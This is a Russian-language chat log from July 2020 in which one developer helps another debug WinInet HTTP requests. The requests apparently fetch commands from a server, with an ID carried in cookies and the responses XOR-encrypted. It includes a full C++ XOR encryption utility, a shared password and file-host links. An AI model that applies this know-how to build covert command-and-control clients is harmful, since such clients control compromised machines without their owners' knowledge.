Timestamp	From	To	Message
2020-07-23 11:19:22.943779	price	mushroom	всё прилизано, в чём дело не пойму (и твой пример перед глазами)
2020-07-23 11:19:44.821691	price	mushroom	запусти его пожалуйста, он очень простой
2020-07-23 11:20:38.186372	mushroom	price	Я пример не давал.
2020-07-23 11:21:20.015759	price	mushroom	давал, как у тебя реализована работа по http
2020-07-23 11:21:28.865836	mushroom	price	Нет.
2020-07-23 11:21:37.022003	mushroom	price	Буза может давал.
2020-07-23 11:21:37.695045	price	mushroom	[20.07.2020 18:07:57] <mushroom> Потом:		httpSendRequest(req, headers, headersLen, body, bodySize)
[20.07.2020 18:08:15] <mushroom>                                 Куки находятся в headers, headersLen.В ручную в заголовок их пиши.
[20.07.2020 18:08:44] <mushroom> Так как ты делаешь сейчас на Windows Server не прокатывает.
[20.07.2020 18:09:39] <mushroom> Это запрос для получения команды с сервера.
[20.07.2020 18:10:16] <mushroom> body, bodySize пустые(NULL и 0).
2020-07-23 11:21:56.340614	mushroom	price	Этот только запрос.
2020-07-23 11:22:14.821218	mushroom	price	Потом читаешь req.
2020-07-23 11:22:17.885923	price	mushroom	e vtyz rfr hfp Get и не идет
2020-07-23 11:22:22.011025	mushroom	price	Там ответ будет.
2020-07-23 11:22:31.720737	price	mushroom	у меня как раз это и не идет
2020-07-23 11:22:38.190560	price	mushroom	или говорит что 404
2020-07-23 11:22:41.302693	price	mushroom	или 400
2020-07-23 11:23:03.662339	mushroom	price	Запрос покажи.
2020-07-23 11:23:12.628735	mushroom	price	Путь, заголовок.
2020-07-23 11:23:25.758530	price	mushroom	сейчас пришлю текстовый файлик
2020-07-23 11:23:26.001139	mushroom	price	Адрес тоже.
2020-07-23 11:23:41.530013	price	mushroom	там всё будет и ИД
2020-07-23 11:23:47.358181	price	mushroom	и пути
2020-07-23 11:24:12.182575	price	mushroom	я все варианты изучил (странно что либо 404 либо 400 ошибку выдает)
2020-07-23 11:24:38.834392	price	mushroom	если флаг ставлю про кукиз
2020-07-23 11:24:48.052118	price	mushroom	как у  тебя
2020-07-23 11:25:07.476586	price	mushroom	если ставлю ноль то 404, если но кукиз -400
2020-07-23 11:25:30.450892	price	mushroom	короче спасай
2020-07-23 11:26:26.721432	mushroom	price	Давай файл.
2020-07-23 11:26:50.413890	price	mushroom	даю, дописываю уже, чтобы всё понятно было и тебе и мне потом
2020-07-23 11:28:55.894073	mushroom	price	Вот тебе утилита шифровки\расшифровки xor id, как на сервере стоит.
2020-07-23 11:28:58.853893	mushroom	price	#include <iostream>
#include <fstream>
#include <string>
#include <memory>

//C++ 17.
//#include <filesystem>

using namespace std;

int main(int argc, char *argv[])
{
    //Проверить количество аргументов.
    if (argc < 4)
    {
        cout << "Too few arguments. Use first argument for key, second argument for source file,"
            " third argument for destination file" << endl;
        return 1;
    }

    //Проверить размер ключа и его кратность 2.
    string hex(argv[1]);
    if (hex.empty() || hex.size() % 2)
    {
        cout << "Wrong key" << endl;
        return 1;
    }

    //Перевести хекс представление ключа в байтовое.
    size_t keySize = hex.size() / 2;
    auto key = make_unique<unsigned char[]>(keySize);
    for (size_t i = 0, j = 0; j < keySize; i += 2, ++j)
    {
        char* check = NULL;
        unsigned char byte = static_cast<unsigned char>(strtoul(hex.substr(i, 2).c_str(),
            &check, 16));
        if (*check != '\0')
        {
            cout << "Wrong key at symbol " << *check << endl;
            return 1;
        }

        key[j] = byte;
    }
    cout << "Key size " << keySize << endl;

    //Открыть исходный файл для чтения двоичных данных.
    fstream src(argv[2], ios_base::in | ios_base::binary);
    if (!src)
    {
        cout << "Can't open source file " << endl;
        return 1;
    }

    //C++ 17.
    //cout << "Input file size " << filesystem::file_size(argv[2]) << endl;

    src.seekg(0, ios_base::end);
    size_t srcSize = src.tellg();
    cout << "Input file size " << srcSize << endl;
    if (srcSize > 10485760)
    {
        cout << "Input file size is too large!" << endl;
        cout << "Key: " << hex << endl;
        cout << "Input file: " << argv[2] << endl;
        cout << "Output file: " << argv[3] << endl;
        return 1;
    }
    src.seekg(0, ios_base::beg);

    //Открыть файл назначения для записи двоичных данных (усекается).
    fstream dest(argv[3], ios_base::out | ios_base::binary | ios_base::trunc);
    if (!dest)
    {
        cout << "Can't open destination file" << endl;
        return 1;
    }

    //Зашифровать\расшифровать файл.
    cout << "Working..." << endl;
    size_t keyIndex = 0;
    size_t destSize = 0;
    while (!src.eof())
    {
        unsigned char byte = static_cast<unsigned char>(src.get());
        if (!src.eof())
        {
            if (destSize < 10485760)
            {
                dest.put(byte ^ key[keyIndex]);
                ++destSize;
            }
            else
            {
                cout << "Output file size is too large!" << endl;
                cout << "Key: " << hex << endl;
                cout << "Input file: " << argv[2] << endl;
                cout << "Output file: " << argv[3] << endl;
                return 1;
            }
        }

        ++keyIndex;
        if (keyIndex == keySize)
            keyIndex = 0;
    }
    cout << "Output file size " << dest.tellg() << endl;

    src.close();
    dest.close();

    //C++ 17.
    //cout << "Output file size " << filesystem::file_size(argv[3]) << endl;
    cout << "Ready" << endl;

    return 0;
}
2020-07-23 11:29:35.930536	mushroom	price	Чтобы проверять что получается у тебя.
2020-07-23 11:30:04.996905	price	mushroom	ok
2020-07-23 11:35:15.082590	price	mushroom	261578874264819908609102035485573088411
2020-07-23 11:35:22.917822	price	mushroom	пароль
2020-07-23 11:36:58.988001	price	mushroom	Download: https://qaz.im/load/YsEkRz/5Rir6A
Delete: https://qaz.im/index.php?a=delete&q=800191228
2020-07-23 11:40:25.472768	mushroom	price	Что такое dechashID
2020-07-23 11:40:28.398926	mushroom	price	?
2020-07-23 11:40:59.979766	price	mushroom	десятичное представление мд5-хеша
2020-07-23 11:41:23.324989	price	mushroom	от идентификатора
2020-07-23 11:41:43.906121	mushroom	price	Вот тут и ошибка. В запросе должно быть хекс представление id.
2020-07-23 11:41:56.907773	price	mushroom	БЛИН
2020-07-23 11:42:08.050175	price	mushroom	но в тз десятичное
2020-07-23 11:42:25.033384	mushroom	price	Попробуй утилитой зашифровать и расщифровать файл какой нибудь этим хекс ключём.
2020-07-23 11:42:39.815075	mushroom	price	Да. Это забыли убрать.
2020-07-23 11:42:44.091903	price	mushroom	которую ты прислал?
2020-07-23 11:42:54.824460	mushroom	price	В C\C++ нету 128 битных чисел.
2020-07-23 11:42:56.720845	price	mushroom	я чуть программировать не бросил
2020-07-23 11:42:59.317203	mushroom	price	Да.
2020-07-23 11:43:39.287794	price	mushroom	ещё и время на процедуру конвертации хекс-дец потратил
2020-07-23 11:44:20.343369	mushroom	price	int icookies = sizeof(cookies)+1; это не нужно, вместо этого lstrlen(cookies)
2020-07-23 11:44:45.175275	mushroom	price	Нулевой символ в этой функции не нужно захватывать.
2020-07-23 11:45:14.272577	price	mushroom	пришел ответ
2020-07-23 11:45:15.799388	price	mushroom	фкq‘
2020-07-23 11:46:07.010952	mushroom	price	Зашифрованный xor твоим id.
2020-07-23 11:46:16.816714	price	mushroom	эта +1 -это уже я в бубен начал бить
2020-07-23 11:46:39.317269	price	mushroom	сейчас расшифруем
2020-07-23 11:48:48.179673	mushroom	price	InternetOpen(L"WinInet Communication",INTERNET_OPEN_TYPE_PRECONFIG,NULL, NULL,0); здесь WinInet Communication можно не писать. У меня так internetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
